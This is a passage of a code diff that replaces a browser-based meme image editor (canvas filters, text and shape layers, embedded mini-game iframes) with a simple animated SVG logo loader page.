@@ -1,1201 +1,1236 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Mystro Design 🤑®</title>
-  <script src="https://cdn.tailwindcss.com"></script>
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-  <style>
-    body {
-      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-      margin: 0;
-      min-height: 100vh;
-      background: url('../Mystro-Editor/Local/Background.webp') no-repeat center center fixed;
-      background-size: cover;
-      color: white;
-      padding: 20px;
-      overflow-x: hidden;
-    }
-    
-    .glass-panel {
-      background: rgba(15, 23, 42, 0.7);
-      backdrop-filter: blur(16px);
-      -webkit-backdrop-filter: blur(16px);
-      border-radius: 12px;
-      border: 1px solid rgba(255, 255, 255, 0.15);
-      box-shadow: 0 8px 32px 0 rgba(31, 38, 135, 0.37);
-    }
-    
-    .glass-button {
-      background: rgba(255, 255, 255, 0.1);
-      backdrop-filter: blur(5px);
-      -webkit-backdrop-filter: blur(5px);
-      border: 1px solid rgba(255, 255, 255, 0.2);
-      transition: all 0.3s ease;
-    }
-    
-    .glass-button:hover {
-      background: rgba(255, 255, 255, 0.2);
-      transform: translateY(-2px);
-      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
-    }
-    
-    .file-input-label {
-      background: rgba(255, 255, 255, 0.1);
-      border: 2px dashed rgba(255, 255, 255, 0.3);
-      transition: all 0.3s ease;
-    }
-    
-    .file-input-label:hover {
-      background: rgba(255, 255, 255, 0.2);
-      border-color: rgba(255, 255, 255, 0.6);
-    }
-    
-    input[type="range"] {
-      -webkit-appearance: none;
-      height: 6px;
-      background: rgba(255, 255, 255, 0.2);
-      border-radius: 5px;
-      outline: none;
-    }
-    
-    input[type="range"]::-webkit-slider-thumb {
-      -webkit-appearance: none;
-      width: 18px;
-      height: 18px;
-      background: #3b82f6;
-      border-radius: 50%;
-      cursor: pointer;
-      border: 2px solid white;
-    }
-    
-    select, input[type="text"] {
-      background: rgba(255, 255, 255, 0.1);
-      border: 1px solid rgba(255, 255, 255, 0.2);
-      color: white;
-    }
-    
-    select:focus, input[type="text"]:focus {
-      outline: none;
-      border-color: #3b82f6;
-    }
-    
-    .drag-drop-zone {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      background: rgba(0, 0, 0, 0.8);
-      border: 4px dashed #3b82f6;
-      display: none;
-      justify-content: center;
-      align-items: center;
-      font-size: 24px;
-      z-index: 1000;
-      pointer-events: none;
-    }
-    
-    .drag-drop-zone.active {
-      display: flex;
-    }
-    
-    canvas {
-      background: rgba(0, 0, 0, 0.3);
-      border: 1px solid rgba(255, 255, 255, 0.3);
-      border-radius: 12px;
-      max-width: 100%;
-      max-height: 100%;
-      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
-    }
-    
-    .layer-item {
-      background: rgba(30, 41, 59, 0.5);
-      transition: all 0.3s ease;
-    }
-    
-    .layer-item:hover {
-      background: rgba(30, 41, 59, 0.7);
-    }
-    
-    .layer-remove {
-      background: #ef4444;
-      transition: all 0.3s ease;
-    }
-    
-    .layer-remove:hover {
-      background: #dc2626;
-    }
-    
-    .game-frame {
-      background: rgba(255, 255, 255, 0.1);
-      border: 2px dashed rgba(255, 255, 255, 0.3);
-      border-radius: 12px;
-      transition: all 0.3s ease;
-    }
-    
-    .game-frame:hover {
-      border-color: #3b82f6;
-      box-shadow: 0 0 15px rgba(59, 130, 246, 0.5);
-    }
-    
-    /* Custom scrollbar */
-    ::-webkit-scrollbar {
-      width: 8px;
-    }
-    
-    ::-webkit-scrollbar-track {
-      background: rgba(255, 255, 255, 0.05);
-    }
-    
-    ::-webkit-scrollbar-thumb {
-      background: rgba(255, 255, 255, 0.2);
-      border-radius: 4px;
-    }
-    
-    ::-webkit-scrollbar-thumb:hover {
-      background: rgba(255, 255, 255, 0.3);
-    }
-    
-    .tab-button {
-      background: transparent;
-      border: none;
-      color: rgba(255, 255, 255, 0.7);
-      transition: all 0.3s ease;
-    }
-    
-    .tab-button.active {
-      color: white;
-      border-bottom: 2px solid #3b82f6;
-    }
-    
-    .tab-button:hover:not(.active) {
-      color: white;
-    }
-  </style>
+<style>
+*{
+  margin:0;
+  padding:0;
+  box-sizing:border-box;
+}
+
+body{
+  background:#111;
+  height:100vh;
+}
+
+.loader{
+  position:fixed;
+  inset:0;
+  background:#111;
+
+  display:flex;
+  justify-content:center;
+  align-items:center;
+
+  z-index:9999;
+
+  animation:
+    moveLoader .45s ease-in-out 1.2s forwards;
+}
+
+.logo{
+  width:280px;
+}
+
+#mask-rect{
+  animation:slideMask 1s ease forwards;
+}
+
+@keyframes slideMask{
+  from{
+    transform:translateY(100%);
+  }
+  to{
+    transform:translateY(0%);
+  }
+}
+
+@keyframes moveLoader{
+  to{
+    transform:translateY(-100%);
+  }
+}
+</style>
 </head>
-<body class="bg-slate-900 text-white">
-  <div class="max-w-7xl mx-auto px-4">
-    <!-- Logo -->
-    <img alt="logo" height="79" src="../Mystro-Editor/Local/DownloadComputerGames.png" title="logo" width="330" class="mx-auto mb-10">
-    
-    <div class="flex flex-col lg:flex-row gap-6">
-      <!-- Controls Panel -->
-      <div class="glass-panel w-full lg:w-80 p-5 h-fit max-h-[calc(100vh-180px)] overflow-y-auto">
-        <!-- Tabs -->
-        <div class="flex border-b border-slate-700 mb-4">
-          <button class="tab-button active px-4 py-2" data-tab="image-tab">
-            <i class="fas fa-image mr-2"></i> Image
-          </button>
-          <button class="tab-button px-4 py-2" data-tab="layers-tab">
-            <i class="fas fa-layer-group mr-2"></i> Layers
-          </button>
-          <button class="tab-button px-4 py-2" data-tab="games-tab">
-            <i class="fas fa-gamepad mr-2"></i> Games
-          </button>
-        </div>
-        
-        <!-- Image Tab Content -->
-        <div id="image-tab" class="tab-content">
-          <!-- Image Upload -->
-          <div class="mb-6">
-            <label for="imageInput" class="file-input-label flex flex-col items-center justify-center p-4 rounded-lg cursor-pointer mb-3">
-              <i class="fas fa-cloud-upload-alt text-2xl mb-2 text-blue-400"></i>
-              <span class="text-sm">Choose Image to Edit</span>
-            </label>
-            <input type="file" id="imageInput" accept="image/*" class="hidden">
-            <div class="drag-drop-zone" id="dropZone">
-              <div class="text-center">
-                <i class="fas fa-cloud-upload-alt text-4xl mb-3"></i>
-                <p>Drop Image Here</p>
-              </div>
-            </div>
-          </div>
-          
-          <!-- Canvas Controls -->
-          <div class="space-y-4">
-            <div>
-              <label class="block text-sm font-medium mb-1">Canvas Width</label>
-              <input type="range" id="widthRange" min="10" max="2000" value="500" class="w-full">
-            </div>
-            <div>
-              <label class="block text-sm font-medium mb-1">Canvas Height</label>
-              <input type="range" id="heightRange" min="10" max="2000" value="500" class="w-full">
-            </div>
-          </div>
-          
-          <!-- Basic Adjustments -->
-          <div class="mt-6">
-            <h4 class="font-medium mb-3 flex items-center">
-              <i class="fas fa-sliders-h mr-2 text-blue-400"></i> Adjustments
-            </h4>
-            <div class="space-y-4">
-              <div>
-                <label class="block text-sm font-medium mb-1">Brightness</label>
-                <input type="range" id="brightness" min="50" max="500" value="100" class="w-full">
-              </div>
-              <div>
-                <label class="block text-sm font-medium mb-1">Contrast</label>
-                <input type="range" id="contrast" min="50" max="1000" value="100" class="w-full">
-              </div>
-              <div>
-                <label class="block text-sm font-medium mb-1">Pixelation</label>
-                <input type="range" id="pixelation" min="0.1" max="25" value="1" step="0.1" class="w-full">
-              </div>
-              <div>
-                <label class="block text-sm font-medium mb-1">Border Radius</label>
-                <input type="range" id="borderRadius" min="0" max="100" value="0" class="w-full">
-            </div>
-          </div>
-        </div>
-        
-        <!-- Text Controls -->
-        <div class="mt-6">
-          <h4 class="font-medium mb-3 flex items-center">
-            <i class="fas fa-font mr-2 text-blue-400"></i> Text
-          </h4>
-          <div class="space-y-3">
-            <input type="text" id="topText" placeholder="Top text" class="w-full px-3 py-2 rounded text-sm">
-            <input type="text" id="bottomText" placeholder="Bottom text" class="w-full px-3 py-2 rounded text-sm">
-            <div>
-              <label class="block text-sm font-medium mb-1">Text Size</label>
-              <input type="range" id="textSize" min="10" max="100" value="30" class="w-full">
-            </div>
-            <div class="grid grid-cols-2 gap-2">
-              <button onclick="generateRandomText()" class="glass-button py-2 px-3 rounded text-sm flex items-center justify-center">
-                <i class="fas fa-language mr-1"></i> Arabic Text
-              </button>
-              <button onclick="generateRandomEmojis()" class="glass-button py-2 px-3 rounded text-sm flex items-center justify-center">
-                <i class="far fa-smile mr-1"></i> Random Emojis
-              </button>
-            </div>
-          </div>
-        </div>
-        
-        <!-- Filters -->
-        <div class="mt-6">
-          <h4 class="font-medium mb-3 flex items-center">
-            <i class="fas fa-filter mr-2 text-blue-400"></i> Filters
-          </h4>
-          <select id="filter" class="w-full px-3 py-2 rounded text-sm">
-            <option value="none">No Filter</option>
-            <option value="grayscale">Grayscale</option>
-            <option value="sepia">Sepia</option>
-            <option value="invert">Invert</option>
-            <option value="blur">Blur</option>
-            <option value="hue-rotate">Hue Rotate</option>
-            <option value="saturate">Saturate</option>
-            <option value="opacity">Opacity</option>
-            <option value="drop-shadow">Drop Shadow</option>
-          </select>
-        </div>
-        
-        <!-- Transform Tools -->
-        <div class="mt-6">
-          <h4 class="font-medium mb-3 flex items-center">
-            <i class="fas fa-vector-square mr-2 text-blue-400"></i> Transform
-          </h4>
-          <div class="grid grid-cols-2 gap-2">
-            <button onclick="flipHorizontal()" class="glass-button py-2 px-3 rounded text-sm flex items-center justify-center">
-              <i class="fas fa-arrows-alt-h mr-1"></i> Flip H
-            </button>
-            <button onclick="flipVertical()" class="glass-button py-2 px-3 rounded text-sm flex items-center justify-center">
-              <i class="fas fa-arrows-alt-v mr-1"></i> Flip V
-            </button>
-            <button onclick="rotateLeft()" class="glass-button py-2 px-3 rounded text-sm flex items-center justify-center">
-              <i class="fas fa-undo mr-1"></i> Rotate Left
-            </button>
-            <button onclick="rotateRight()" class="glass-button py-2 px-3 rounded text-sm flex items-center justify-center">
-              <i class="fas fa-redo mr-1"></i> Rotate Right
-            </button>
-          </div>
-        </div>
-        
-        <!-- Overlay Controls -->
-        <div class="mt-6">
-          <h4 class="font-medium mb-3 flex items-center">
-            <i class="fas fa-images mr-2 text-blue-400"></i> Overlay
-          </h4>
-          <div class="space-y-3">
-            <label for="overlayInput" class="file-input-label flex flex-col items-center justify-center p-3 rounded-lg cursor-pointer">
-              <i class="fas fa-image mr-1 text-blue-400"></i>
-              <span class="text-xs">Choose Overlay Image</span>
-            </label>
-            <input type="file" id="overlayInput" accept="image/*", class="hidden">
-            <div>
-              <label class="block text-sm font-medium mb-1">Opacity</label>
-              <input type="range" id="overlayOpacity" min="0", max="100", value="100", class="w-full">
-            </div>
-          </div>
-        </div>
-        
-        <!-- Layer Tools -->
-        <div class="mt-6">
-          <h4 class="font-medium mb-3 flex items-center">
-            <i class="fas fa-plus-circle mr-2 text-blue-400"></i> Add Layer
-          </h4>
-          <div class="grid grid-cols-2 gap-2">
-            <button id="addTextLayerBtn" class="glass-button py-2 px-3 rounded text-sm flex items-center justify-center">
-              <i class="fas fa-font mr-1"></i> Text
-            </button>
-            <label for="layerInput" class="glass-button py-2 px-3 rounded text-sm flex items-center justify-center cursor-pointer">
-              <i class="fas fa-image mr-1"></i> Image
-            </label>
-            <input type="file" id="layerInput" accept="image/*", class="hidden">
-            <button id="addCircleLayerBtn" class="glass-button py-2 px-3 rounded text-sm flex items-center justify-center">
-              <i class="far fa-circle mr-1"></i> Circle
-            </button>
-            <button id="addArrowLayerBtn" class="glass-button py-2 px-3 rounded text-sm flex items-center justify-center">
-              <i class="fas fa-arrow-right mr-1"></i> Arrow
-            </button>
-            <button onclick="resetLayers()" class="glass-button py-2 px-3 rounded text-sm flex items-center justify-center bg-red-500/20 border-red-500/50">
-              <i class="fas fa-trash mr-1"></i> Reset
-            </button>
-          </div>
-        </div>
-        
-        <!-- Export Button -->
-        <button onclick="exportImage()" class="w-full mt-6 py-3 px-4 bg-blue-600 hover:bg-blue-700 rounded-lg font-medium flex items-center justify-center transition-all">
-          <i class="fas fa-download mr-2"></i> Export Image
-        </button>
-      </div>
-      
-      <!-- Layers Tab Content -->
-      <div id="layers-tab" class="tab-content hidden">
-        <div id="layerFeatures">
-          <div class="flex justify-between items-center mb-3">
-            <h3 class="font-medium flex items-center">
-              <i class="fas fa-layer-group mr-2"></i> Layers
-            </h3>
-            <span class="text-xs bg-slate-700 px-2 py-1 rounded">Total: <span id="layerCount">0</span></span>
-          </div>
-          <div id="layerList" class="space-y-2"></div>
-        </div>
-      </div>
-      
-      <!-- Games Tab Content -->
-      <div id="games-tab" class="tab-content hidden">
-        <div class="space-y-3">
-          <h3 class="font-medium mb-3 flex items-center">
-            <i class="fas fa-gamepad mr-2 text-blue-400"></i> Mini Games
-          </h3>
-          <iframe title="Game Frame" class="game-frame w-full h-32" src="https://crazy-cattle3d.org/game/crazycattle3d/" frameborder="0" data-gameplayer-content="true"></iframe>
-          <iframe title="Game Frame" class="game-frame w-full h-32" src="https://aldude999.net/wasm_doom/" frameborder="0" data-gameplayer-content="true" scrolling="no"></iframe>
-          <iframe title="Game Frame" class="game-frame w-full h-32" src="https://games-online.io/game/HappyWheels/" frameborder="0" data-gameplayer-content="true" scrolling="no"></iframe>
-          <iframe title="Game Frame" class="game-frame w-full h-32" src="https://lnahtml.github.io/a8/subway-surfers-newyork/" frameborder="0" data-gameplayer-content="true" scrolling="no"></iframe>
-        </div>
-      </div>
-    </div>
-    
-    <!-- Canvas Area -->
-    <div class="flex-1 glass-panel p-5">
-      <div class="flex justify-center items-center h-full min-h-[600px]">
-        <canvas id="mainCanvas" width="500" height="500"></canvas>
-      </div>
-    </div>
-  </div>
+<body>
+<div class="loader">
+<svg class="logo" viewBox="0 0 500 150">
+  <image
+    href="../Mystro-Editor/Local/logo-gray.svg"
+    width="500"
+    height="150"
+  />
+
+  <mask id="fillMask">
+    <rect
+      id="mask-rect"
+      width="500"
+      height="150"
+      fill="white"
+      transform="translate(0 150)"
+    />
+  </mask>
+  <image
+    href="../Mystro-Editor/Local/logo-white.svg"
+    width="500"
+    height="150"
+    mask="url(#fillMask)"
+  />
+
+</svg>
 </div>
-<footer class="footer">
-  <div class="flex justify-center items-center space-x-4 mt-2">
-    <p>
-      Best shitpost designer: 
-      <a href="#" class="font-medium">Sabona AKA Schneider</a>
-    </p>
-    <img 
-      src="https://cdn.discordapp.com/avatars/1278441086410293354/4fc4fad686cdf3e37bf542460c28767b?size=64" 
-      alt="Sabona Avatar" 
-      class="w-8 h-8 rounded-full"
-    >
-  </div>
-</footer>
-<script>
-  // Main variables and canvas setup
-  const canvas = document.getElementById('mainCanvas');
-  const ctx = canvas.getContext('2d');
-  let currentImage = null;
-  let overlayImage = null;
-  let scaleX = 1, scaleY = 1;
-  let rotation = 0;
-  let layers = [];
-  let layerIdCounter = 0;
-  let draggingLayer = null;
-  let dragOffsetX = 0, dragOffsetY = 0;
-  
-  // Shape drawing mode variables
-  let currentShapeTool = null; // "circle" or "arrow"
-  let drawingShape = false;
-  let shapeStartX = 0, shapeStartY = 0;
-  let shapeCurrentX = 0, shapeCurrentY = 0;
-  
-  // Initialize canvas background
-  ctx.fillStyle = 'rgba(0,0,0,0.2)';
-  ctx.fillRect(0, 0, canvas.width, canvas.height);
-  
-  // Tab functionality
-  document.querySelectorAll('[data-tab]').forEach(tab => {
-    tab.addEventListener('click', () => {
-      // Update active tab
-      document.querySelectorAll('.tab-button').forEach(t => t.classList.remove('active'));
-      tab.classList.add('active');
-      
-      // Show corresponding content
-      document.querySelectorAll('.tab-content').forEach(content => content.classList.add('hidden'));
-      const tabId = tab.getAttribute('data-tab');
-      document.getElementById(tabId).classList.remove('hidden');
-    });
-  });
-  
-  // Handle paste event for image loading
-  document.addEventListener('paste', (e) => {
-    const items = e.clipboardData.items;
-    for (const item of items) {
-      if (item.type.indexOf('image') === 0) {
-        const blob = item.getAsFile();
-        const reader = new FileReader();
-        reader.onload = (event) => { loadImage(event.target.result); };
-        reader.readAsDataURL(blob);
-      }
-    }
-  });
-  
-  // Drag-drop handlers for main image
-  const dropZone = document.getElementById('dropZone');
-  document.body.addEventListener('dragover', (e) => { e.preventDefault(); dropZone.classList.add('active'); });
-  document.body.addEventListener('dragleave', (e) => { dropZone.classList.remove('active'); });
-  document.body.addEventListener('drop', (e) => {
-    e.preventDefault();
-    dropZone.classList.remove('active');
-    const files = e.dataTransfer.files;
-    if (files.length > 0) {
-      const file = files[0];
-      if (file.type.startsWith('image/')) {
-        const reader = new FileReader();
-        reader.onload = (event) => { loadImage(event.target.result); };
-        reader.readAsDataURL(file);
-      }
-    }
-  });
-  
-  // Load main image
-  function loadImage(src) {
-    currentImage = new Image();
-    currentImage.onload = function() {
-      canvas.width = currentImage.naturalWidth;
-      canvas.height = currentImage.naturalHeight;
-      document.getElementById('widthRange').value = canvas.width;
-      document.getElementById('heightRange').value = canvas.height;
-      updateCanvas();
-    };
-    currentImage.src = src;
-  }
-  
-  // Main image input
-  document.getElementById('imageInput').addEventListener('change', (e) => {
-    const file = e.target.files[0];
-    if (file) {
-      const reader = new FileReader();
-      reader.onload = (event) => { loadImage(event.target.result); };
-      reader.readAsDataURL(file);
-    }
-  });
-  
-  // Overlay image input
-  document.getElementById('overlayInput').addEventListener('change', (e) => {
-    const reader = new FileReader();
-    reader.onload = (event) => {
-      overlayImage = new Image();
-      overlayImage.onload = () => { updateCanvas(); };
-      overlayImage.src = event.target.result;
-    };
-    reader.readAsDataURL(e.target.files[0]);
-  });
-  
-  // Draggable image layer input (with opacity)
-  document.getElementById('layerInput').addEventListener('change', (e) => {
-    const file = e.target.files[0];
-    if (file) {
-      const reader = new FileReader();
-      reader.onload = (event) => {
-        let newLayerImg = new Image();
-        newLayerImg.onload = () => {
-          layers.push({
-            id: layerIdCounter++,
-            type: "image",
-            img: newLayerImg,
-            x: canvas.width / 2,
-            y: canvas.height / 2,
-            rotation: 0,
-            scale: 1,
-            opacity: 1
-          });
-          updateCanvas();
-          updateLayerList();
-        };
-        newLayerImg.src = event.target.result;
-      };
-      reader.readAsDataURL(file);
-    }
-  });
-  
-  // Button to add a text layer
-  document.getElementById('addTextLayerBtn').addEventListener('click', () => {
-    layers.push({
-      id: layerIdCounter++,
-      type: "text",
-      text: "New Text",
-      x: canvas.width / 2,
-      y: canvas.height / 2,
-      rotation: 0,
-      scale: 1,
-      color: "#ffffff"
-    });
-    updateCanvas();
-    updateLayerList();
-  });
-  
-  // Shape drawing tool buttons
-  document.getElementById('addCircleLayerBtn').addEventListener('click', () => {
-    currentShapeTool = "circle";
-    alert("Circle tool active. Click and drag on the canvas to draw a red circle (stroke only).");
-  });
-  document.getElementById('addArrowLayerBtn').addEventListener('click', () => {
-    currentShapeTool = "arrow";
-    alert("Arrow tool active. Click and drag on the canvas to draw a red arrow.");
-  });
-  
-  // Common controls listener
-  const controls = ['widthRange','heightRange','brightness','contrast','pixelation','borderRadius','filter','topText','bottomText','overlayOpacity','textSize'];
-  controls.forEach(id => { document.getElementById(id).addEventListener('input', updateCanvas); });
-  
-  // New function to generate random Arabic text (as before)
-  function generateRandomText() {
-    if (!currentImage) return alert('Load an image first!');
-    const text = generateRandomArabicText(Math.floor(Math.random() * 10) + 5);
-    const x = Math.random() * canvas.width;
-    const y = Math.random() * canvas.height;
-    const rot = (Math.random() * 360) - 180;
-    const size = Math.floor(Math.random() * 50) + 20;
-    ctx.save();
-    ctx.translate(x, y);
-    ctx.rotate((rot * Math.PI) / 180);
-    ctx.font = `${size}px Impact`;
-    ctx.fillStyle = 'white';
-    ctx.strokeStyle = 'black';
-    ctx.lineWidth = 2;
-    ctx.textAlign = 'center';
-    ctx.textBaseline = 'middle';
-    ctx.strokeText(text, 0, 0);
-    ctx.fillText(text, 0, 0);
-    ctx.restore();
-  }
-  
-  function generateRandomArabicText(length) {
-    const arabicChars = 'قلاوي';
-    let result = '';
-    for (let i = 0; i < length; i++) {
-      result += arabicChars.charAt(Math.floor(Math.random() * arabicChars.length));
-    }
-    return result;
-  }
-  
-  // New function to generate random emojis using given set of emojis
-  function generateRandomEmojis() {
-    if (!currentImage) return alert('Load an image first!');
-    const emojiChars = "🧤🙀 ⭕🔥💀🗣️🤑🍆🔪🥶😱👣👽👨‍🦲👩‍🦲🧑‍🦲🤑😜😋👅😝";
-    const length = Math.floor(Math.random() * 10) + 5;
-    let result = '';
-    for (let i = 0; i < length; i++) {
-      result += emojiChars.charAt(Math.floor(Math.random() * emojiChars.length));
-    }
-    const x = Math.random() * canvas.width;
-    const y = Math.random() * canvas.height;
-    const rot = (Math.random() * 360) - 180;
-    const size = Math.floor(Math.random() * 50) + 20;
-    ctx.save();
-    ctx.translate(x, y);
-    ctx.rotate((rot * Math.PI) / 180);
-    ctx.font = `${size}px Impact`;
-    ctx.fillStyle = 'white';
-    ctx.strokeStyle = 'black';
-    ctx.lineWidth = 2;
-    ctx.textAlign = 'center';
-    ctx.textBaseline = 'middle';
-    ctx.strokeText(result, 0, 0);
-    ctx.fillText(result, 0, 0);
-    ctx.restore();
-  }
-  
-  function getFilterString() {
-    const filter = document.getElementById('filter').value;
-    let str = "";
-    if (filter === "grayscale") str = "grayscale(100%)";
-    else if (filter === "sepia") str = "sepia(100%)";
-    else if (filter === "invert") str = "invert(100%)";
-    else if (filter === "blur") str = "blur(5px)";
-    else if (filter === "hue-rotate") str = "hue-rotate(90deg)";
-    else if (filter === "saturate") str = "saturate(150%)";
-    else if (filter === "opacity") str = "opacity(50%)";
-    else if (filter === "drop-shadow") str = "drop-shadow(5px 5px 5px black)";
-    return str;
-  }
-  
-  function updateCanvas() {
-    if (!currentImage) return;
-    const width = parseInt(document.getElementById('widthRange').value);
-    const height = parseInt(document.getElementById('heightRange').value);
-    const brightness = document.getElementById('brightness').value;
-    const contrast = document.getElementById('contrast').value;
-    const pixelation = parseInt(document.getElementById('pixelation').value);
-    const borderRadius = parseInt(document.getElementById('borderRadius').value);
-    const overlayOpacity = parseInt(document.getElementById('overlayOpacity').value) / 100;
-    const textSize = parseInt(document.getElementById('textSize').value);
-    
-    canvas.width = width;
-    canvas.height = height;
-    ctx.clearRect(0, 0, canvas.width, canvas.height);
-    
-    // Draw main image with filter
-    ctx.filter = getFilterString() + ` brightness(${brightness}%) contrast(${contrast}%)`;
-    if (pixelation > 1) {
-      const size = pixelation * 0.01 * Math.min(canvas.width, canvas.height);
-      ctx.drawImage(currentImage, 0, 0, currentImage.width, currentImage.height, 0, 0, size, size);
-      ctx.drawImage(canvas, 0, 0, size, size, 0, 0, canvas.width, canvas.height);
-    } else {
-      ctx.drawImage(currentImage, 0, 0, canvas.width, canvas.height);
-    }
-    ctx.filter = "none";
-    
-    // Apply border radius if any
-    if (borderRadius > 0) {
-      ctx.globalCompositeOperation = 'destination-in';
-      ctx.beginPath();
-      ctx.roundRect(0, 0, canvas.width, canvas.height, borderRadius);
-      ctx.fill();
-      ctx.globalCompositeOperation = 'source-over';
-    }
-    
-    // Draw overlay image if present
-    if (overlayImage) {
-      ctx.globalAlpha = overlayOpacity;
-      ctx.drawImage(overlayImage, 0, 0, canvas.width, canvas.height);
-      ctx.globalAlpha = 1;
-    }
-    
-    // Draw top and bottom text
-    ctx.fillStyle = 'white';
-    ctx.strokeStyle = 'black';
-    ctx.lineWidth = 2;
-    ctx.textAlign = 'center';
-    ctx.font = `${textSize}px Impact`;
-    const topText = document.getElementById('topText').value;
-    const bottomText = document.getElementById('bottomText').value;
-    ctx.strokeText(topText, canvas.width/2, textSize * 1.2);
-    ctx.fillText(topText, canvas.width/2, textSize * 1.2);
-    ctx.strokeText(bottomText, canvas.width/2, canvas.height - textSize * 0.5);
-    ctx.fillText(bottomText, canvas.width/2, canvas.height - textSize * 0.5);
-    
-    // Draw layers (images, text, shapes)
-    layers.forEach(layer => {
-      ctx.save();
-      ctx.translate(layer.x, layer.y);
-      ctx.rotate(layer.rotation * Math.PI/180);
-      if (layer.type === "image") {
-        ctx.globalAlpha = layer.opacity;
-        ctx.scale(layer.scale, layer.scale);
-        ctx.drawImage(layer.img, -layer.img.width/2, -layer.img.height/2);
-      } else if (layer.type === "text") {
-        ctx.font = `${30 * layer.scale}px Impact`;
-        ctx.textAlign = "center";
-        ctx.textBaseline = "middle";
-        ctx.fillStyle = layer.color;
-        ctx.strokeStyle = "black";
-        ctx.lineWidth = 2;
-        ctx.strokeText(layer.text, 0, 0);
-        ctx.fillText(layer.text, 0, 0);
-      } else if (layer.type === "shape") {
-        ctx.globalAlpha = layer.opacity;
-        if (layer.shape === "circle") {
-          ctx.strokeStyle = layer.color;
-          ctx.lineWidth = layer.strokeWidth || 2;
-          ctx.scale(layer.scale, layer.scale);
-          ctx.beginPath();
-          ctx.arc(0, 0, 50, 0, 2 * Math.PI);
-          ctx.stroke();
-        } else if (layer.shape === "arrow") {
-          ctx.strokeStyle = layer.color;
-          ctx.lineWidth = 2;
-          ctx.scale(layer.scale, layer.scale);
-          ctx.beginPath();
-          ctx.moveTo(0, 0);
-          ctx.lineTo(100, 0);
-          ctx.stroke();
-          ctx.beginPath();
-          ctx.moveTo(100, 0);
-          ctx.lineTo(80, -10);
-          ctx.lineTo(80, 10);
-          ctx.closePath();
-          ctx.fillStyle = layer.color;
-          ctx.fill();
-          ctx.stroke();
-        }
-      }
-      ctx.restore();
-    });
-  }
-  
-  // Define bounding boxes for layers to support dragging
-  function getLayerBounds(layer) {
-    if (layer.type === "image") {
-      return { width: layer.img.width, height: layer.img.height };
-    } else if (layer.type === "text") {
-      ctx.save();
-      ctx.font = `${30 * layer.scale}px Impact`;
-      const textWidth = ctx.measureText(layer.text).width;
-      ctx.restore();
-      return { width: textWidth, height: 30 * layer.scale };
-    } else if (layer.type === "shape") {
-      if (layer.shape === "circle") return { width: 110, height: 110 };
-      else if (layer.shape === "arrow") return { width: 110, height: 40 };
-    }
-  }
-  
-  // Check if mouse is inside a layer's bounding box
-  function isInsideLayer(layer, mouseX, mouseY) {
-    const dx = mouseX - layer.x;
-    const dy = mouseY - layer.y;
-    const angle = -layer.rotation * Math.PI / 180;
-    const cos = Math.cos(angle);
-    const sin = Math.sin(angle);
-    let localX, localY;
-    if (layer.type === "image" || layer.type === "shape") {
-      localX = (dx * cos - dy * sin) / layer.scale;
-      localY = (dx * sin + dy * cos) / layer.scale;
-    } else {
-      localX = dx * cos - dy * sin;
-      localY = dx * sin + dy * cos;
-    }
-    const bounds = getLayerBounds(layer);
-    return (localX >= -bounds.width/2 && localX <= bounds.width/2 &&
-            localY >= -bounds.height/2 && localY <= bounds.height/2);
-  }
-  
-  // Canvas mouse events for dragging layers and drawing shapes
-  canvas.addEventListener('mousedown', (e) => {
-    const rect = canvas.getBoundingClientRect();
-    const mouseX = e.clientX - rect.left;
-    const mouseY = e.clientY - rect.top;
-    if (currentShapeTool !== null) {
-      drawingShape = true;
-      shapeStartX = mouseX;
-      shapeStartY = mouseY;
-      shapeCurrentX = mouseX;
-      shapeCurrentY = mouseY;
-      return;
-    }
-    for (let i = layers.length - 1; i >= 0; i--) {
-      if (isInsideLayer(layers[i], mouseX, mouseY)) {
-        draggingLayer = layers[i];
-        dragOffsetX = mouseX - layers[i].x;
-        dragOffsetY = mouseY - layers[i].y;
-        // Bring selected layer to top
-        layers.splice(i, 1);
-        layers.push(draggingLayer);
-        updateCanvas();
-        break;
-      }
-    }
-  });
-  
-  canvas.addEventListener('mousemove', (e) => {
-    const rect = canvas.getBoundingClientRect();
-    const mouseX = e.clientX - rect.left;
-    const mouseY = e.clientY - rect.top;
-    if (drawingShape) {
-      shapeCurrentX = mouseX;
-      shapeCurrentY = mouseY;
-      updateCanvas();
-      drawPreviewShape();
-      return;
-    }
-    if (draggingLayer) {
-      draggingLayer.x = mouseX - dragOffsetX;
-      draggingLayer.y = mouseY - dragOffsetY;
-      updateCanvas();
-    }
-  });
-  
-  canvas.addEventListener('mouseup', (e) => {
-    if (drawingShape) {
-      drawingShape = false;
-      const rect = canvas.getBoundingClientRect();
-      shapeCurrentX = e.clientX - rect.left;
-      shapeCurrentY = e.clientY - rect.top;
-      if (currentShapeTool === "circle") {
-        let dx = shapeCurrentX - shapeStartX;
-        let dy = shapeCurrentY - shapeStartY;
-        let radius = Math.sqrt(dx*dx + dy*dy);
-        let scaleVal = radius / 50;
-        layers.push({
-          id: layerIdCounter++,
-          type: "shape",
-          shape: "circle",
-          x: shapeStartX,
-          y: shapeStartY,
-          rotation: 0,
-          scale: scaleVal,
-          color: "red",
-          opacity: 1,
-          strokeWidth: 2
-        });
-      } else if (currentShapeTool === "arrow") {
-        let dx = shapeCurrentX - shapeStartX;
-        let dy = shapeCurrentY - shapeStartY;
-        let length = Math.sqrt(dx*dx + dy*dy);
-        let scaleVal = length / 100;
-        let angleDeg = Math.atan2(dy, dx) * (180/Math.PI);
-        layers.push({
-          id: layerIdCounter++,
-          type: "shape",
-          shape: "arrow",
-          x: shapeStartX,
-          y: shapeStartY,
-          rotation: angleDeg,
-          scale: scaleVal,
-          color: "red",
-          opacity: 1
-        });
-      }
-      currentShapeTool = null;
-      updateCanvas();
-      updateLayerList();
-      return;
-    }
-    draggingLayer = null;
-  });
-  
-  canvas.addEventListener('mouseout', (e) => {
-    draggingLayer = null;
-    if (drawingShape) {
-      drawingShape = false;
-      currentShapeTool = null;
-      updateCanvas();
-    }
-  });
-  
-  function drawPreviewShape() {
-    if (!drawingShape) return;
-    ctx.save();
-    ctx.setLineDash([5,5]);
-    ctx.strokeStyle = "red";
-    if (currentShapeTool === "circle") {
-      let dx = shapeCurrentX - shapeStartX;
-      let dy = shapeCurrentY - shapeStartY;
-      let radius = Math.sqrt(dx*dx + dy*dy);
